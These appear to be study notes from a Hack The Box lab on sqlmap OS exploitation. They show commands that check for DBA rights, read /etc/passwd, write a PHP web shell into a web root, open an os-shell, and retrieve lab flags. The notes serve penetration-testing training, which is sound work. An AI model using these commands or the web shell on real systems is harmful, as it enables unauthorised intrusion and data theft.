# OS Exploitation

SQLMap has the ability to utilize an SQL Injection to read and write files from the local system outside the DBMS.
SQLMap can also attempt to give us direct command execution on the remote host if we had the proper privileges.

An example of such a command is:
LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;

## Checking for DBA Privileges

sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba

current user is DBA: False
current user is DBA: True

## Reading Local Files

sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"

cat ~/.sqlmap/output/www.example.com/files/_etc_passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...SNIP...

## Writing Local Files

echo '<?php system($_GET["cmd"]); ?>' > shell.php
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"

curl http://www.example.com/shell.php?cmd=ls+-la
total 148
drwxrwxrwt 1 www-data www-data   4096 Nov 19 17:54 .
drwxr-xr-x 1 www-data www-data   4096 Nov 19 08:15 ..
-rw-rw-rw- 1 mysql    mysql       188 Nov 19 07:39 basic.php
...SNIP...

## OS Command Execution

sqlmap -u "http://www.example.com/?id=1" --os-shell

[18:02:45] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
No output

sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E

os-shell> ls -la

## LAB

sqlmap -u 'http://83.136.251.235:55237/?id=1' --is-dba

[20:47:31] [INFO] testing if current user is DBA
[20:47:31] [INFO] fetching current user
current user is DBA: True

sqlmap -u 'http://83.136.251.235:55237/?id=1' --file-read "/var/www/html/flag.txt"

[20:48:22] [INFO] the local file '/home/htb-ac-786011/.local/share/sqlmap/output/83.136.251.235/files/_var_www_html_flag.txt' and the remote file '/var/www/html/flag.txt' have the same size (31 B)
files saved to [1]:
[*] /home/htb-ac-786011/.local/share/sqlmap/output/83.136.251.235/files/_var_www_html_flag.txt (same file)

cat /home/htb-ac-786011/.local/share/sqlmap/output/83.136.251.235/files/_var_www_html_flag.txt
HTB{5up3r_u53r5_4r3_p0w3rful!}

sqlmap -u 'http://83.136.251.235:55237/?id=1' --os-shell

os-shell> ls -l /root/
do you want to retrieve the command standard output? [Y/n/a] Y
[20:51:47] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
[20:51:47] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
No output

sqlmap -u 'http://83.136.251.235:55237/?id=1' --os-shell --technique=E

os-shell> ls -l /root/
do you want to retrieve the command standard output? [Y/n/a] Y
command standard output: 'ls: cannot open directory '/root/': Permission denied'
os-shell> find / -name *flag*;

os-shell> find / -name *flag*;
do you want to retrieve the command standard output? [Y/n/a] Y
command standard output:
---
/var/www/html/flag.txt
/flag.txt
---
os-shell> 

cat /flag.txt
'HTB{n3v3r_run_db_45_db4}'